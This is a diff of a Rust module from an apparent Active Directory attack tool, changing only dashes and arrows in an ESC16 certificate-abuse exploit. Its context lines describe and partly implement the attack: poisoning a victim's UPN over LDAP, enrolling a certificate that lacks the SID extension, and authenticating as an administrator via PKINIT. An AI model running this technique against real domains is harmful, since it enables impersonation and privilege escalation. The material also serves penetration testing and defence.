@@ -1,4 +1,4 @@
-//! ESC16 — Machine Account Certificate + Security Extension Disablement
+//! ESC16 -- Machine Account Certificate + Security Extension Disablement
 //!
 //! ESC16 combines two conditions:
 //!
@@ -9,7 +9,7 @@
 //!
 //! 2. The attacker holds **GenericWrite** (or equivalent) over a victim account
 //!    and can change the victim's `userPrincipalName` (UPN) to the target's UPN
-//!    before enrollment — similar to ESC9 but specifically abusing the
+//!    before enrollment -- similar to ESC9 but specifically abusing the
 //!    NO_SECURITY_EXTENSION behavior rather than weak mapping enforcement.
 //!
 //! Without the security extension, the KDC falls back to the legacy
@@ -25,10 +25,10 @@
 //!
 //! **Attack flow:**
 //! 1. Modify the victim's UPN to the target's UPN (e.g. `administrator@corp.local`).
-//! 2. Enroll in the template using the victim's credentials → cert is issued
+//! 2. Enroll in the template using the victim's credentials -> cert is issued
 //!    with the target's UPN in the SAN but without the security SID extension.
 //! 3. Restore the victim's original UPN.
-//! 4. Authenticate with the cert via PKINIT → KDC maps by UPN → TGT as target.
+//! 4. Authenticate with the cert via PKINIT -> KDC maps by UPN -> TGT as target.
 //!
 //! Reference: SpecterOps "Certified Pre-Owned" updates (2024), TrustedSec research
 
@@ -39,9 +39,9 @@ use crate::adcs::{IssuedCertificate, create_client_auth_csr};
 use crate::error::{OverthroneError, Result};
 use tracing::info;
 
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 //  Constants
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 
 /// Re-export the flag from esc9 for convenience
 pub use crate::adcs::esc9::CT_FLAG_NO_SECURITY_EXTENSION;
@@ -55,9 +55,9 @@ pub const STRONG_CERT_BINDING_DISABLED: u32 = 0;
 pub const STRONG_CERT_BINDING_COMPAT: u32 = 1;
 pub const STRONG_CERT_BINDING_ENFORCED: u32 = 2;
 
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 //  Types
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 
 /// A template vulnerable to ESC16
 #[derive(Debug, Clone)]
@@ -110,9 +110,9 @@ pub struct Esc16Result {
     pub live_upn_modified: bool,
 }
 
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 //  Detection helpers
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 
 /// Check whether a template is vulnerable to ESC16.
 /// Requirements:
@@ -154,9 +154,9 @@ pub fn strong_cert_binding_check_commands(dc: &str) -> Vec<String> {
     ]
 }
 
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 //  UPN poisoning (reuses ESC9 LDAP helpers)
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 
 /// Generate UPN modification commands for ESC16 (guidance-only)
 pub fn upn_poison_commands(
@@ -184,11 +184,11 @@ pub fn upn_poison_commands(
     (set_cmd, restore_cmd)
 }
 
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 //  Exploiter
-// ─────────────────────────────────────────────────────────
+// ---------------------------------------------------------
 
-/// ESC16 exploiter — CT_FLAG_NO_SECURITY_EXTENSION + UPN poisoning
+/// ESC16 exploiter -- CT_FLAG_NO_SECURITY_EXTENSION + UPN poisoning
 pub struct Esc16Exploiter {
     web_client: WebEnrollmentClient,
 }
@@ -205,11 +205,11 @@ impl Esc16Exploiter {
         Ok(Self { web_client })
     }
 
-    /// Execute the ESC16 attack — guidance-only mode (does not modify LDAP).
+    /// Execute the ESC16 attack -- guidance-only mode (does not modify LDAP).
     /// Produces the cert request assuming the UPN has already been poisoned.
     pub async fn exploit(&self, config: &Esc16Config) -> Result<Esc16Result> {
         info!(
-            "ESC16: Exploiting NO_SECURITY_EXTENSION template '{}' → impersonate '{}'",
+            "ESC16: Exploiting NO_SECURITY_EXTENSION template '{}' -> impersonate '{}'",
             config.template, config.target_upn
         );
 
@@ -236,7 +236,7 @@ impl Esc16Exploiter {
         // Verify the certificate does NOT contain the security extension
         if crate::adcs::esc15::cert_has_security_extension(&cert_data) {
             tracing::warn!(
-                "ESC16: Unexpected — the certificate DOES contain the security SID extension. \
+                "ESC16: Unexpected -- the certificate DOES contain the security SID extension. \
                  The CT_FLAG_NO_SECURITY_EXTENSION flag may not have taken effect."
             );
         }
@@ -278,7 +278,7 @@ impl Esc16Exploiter {
             "ESC16: Template '{}' has CT_FLAG_NO_SECURITY_EXTENSION set, so the CA \
              omits the SID-bearing security extension from issued certificates. By \
              poisoning the victim's UPN to '{}' and enrolling, the resulting certificate \
-             maps to '{}' on PKINIT — granting a TGT as that principal (assuming \
+             maps to '{}' on PKINIT -- granting a TGT as that principal (assuming \
              StrongCertificateBindingEnforcement ≤ 1).",
             config.template, config.target_upn, config.target_upn
         );
@@ -316,7 +316,7 @@ impl Esc16Exploiter {
         ldaps: bool,
     ) -> Result<Esc16Result> {
         info!(
-            "ESC16: Live UPN poisoning {} → {} via LDAP",
+            "ESC16: Live UPN poisoning {} -> {} via LDAP",
             config.victim, config.target_upn
         );
 
@@ -365,7 +365,7 @@ impl Esc16Exploiter {
             })?;
 
         info!(
-            "ESC16: Poisoned {}'s UPN → {}",
+            "ESC16: Poisoned {}'s UPN -> {}",
             config.victim, config.target_upn
         );
 
@@ -383,7 +383,7 @@ impl Esc16Exploiter {
             let _ = session
                 .modify_replace(victim_dn, "userPrincipalName", restore_upn.as_bytes())
                 .await;
-            info!("ESC16: Restored {}'s UPN → {}", config.victim, restore_upn);
+            info!("ESC16: Restored {}'s UPN -> {}", config.victim, restore_upn);
         }
 
         let _ = session.disconnect().await;
